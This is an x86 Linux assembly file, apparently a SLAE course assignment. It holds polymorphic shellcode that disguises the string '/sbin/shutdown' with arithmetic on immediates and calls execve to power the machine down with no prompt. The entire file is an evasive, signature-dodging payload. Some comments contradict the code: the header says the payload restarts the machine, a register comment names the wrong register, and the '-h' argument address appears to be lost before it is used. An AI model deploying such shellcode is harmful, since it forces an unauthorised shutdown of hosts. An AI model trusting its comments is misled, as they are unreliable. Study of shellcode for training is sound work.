; SLAE Assigment 6 - Polymorphic shellcode 2 (Shutdown)
; Author: rtmcx (rtmcx@protonmail.com)
; 
; Executes "sbin/shutdown -h now"
; which restarts the computer, no questions asked

global _start

section .text
_start:
    xor eax, eax 			; Clear eax,
    mov edx, eax  			; and ebx
	push	edx				; Push 0
	push  	word 0x682d		; Push '-h'
	
	mov	edi,esp				; Put address to '-h' in edi
	push	eax				; Push 0
	push 	dword 0x776f6e	; Push 'won' (now)
	mov   	edi,esp			; Address to 'now' in edi
	
	; Put the string "/sbin/shutdown" on stack
	push  	edx				; push 0
	mov 	esi, 0x6e776f60	; 'nwo`'
	add 	esi, 0x4		; to get nwod (down)
	push  	esi				; push it
	mov	esi, 0x74756879		; 'tuh?'
	sub 	esi, 0x6		; to get tuhs (shut)
	push  	esi				; push it
	mov	esi, 0x2f2f6e60		; '//n`'
	add 	esi, 0x9		; to get 'ni//' (in//)
	push  	esi				; push it
	mov	esi, 0x62732f2a		; 'bs/*'
	add	esi, 0x5			; to get 'sb//' (//sb) 
	push  	esi				; push it

	; Set up the syscall
	mov   	al,0x9			; Syscall execve (scrambled).. 
	add 	al, 2			; .. needs to be 11
	mov   	ebx,esp			; Address of "/sbin/shutdown' to ebx 
	push  	edx				; Push 0 (string terminator)
	push  	edi				; Push address of 'now' 
	push  	ebx				; Address of string to execute
	mov   	ecx,esp			; Address of "shutdown -h now" to ecx
	int   	0x80 			; Execute syscall
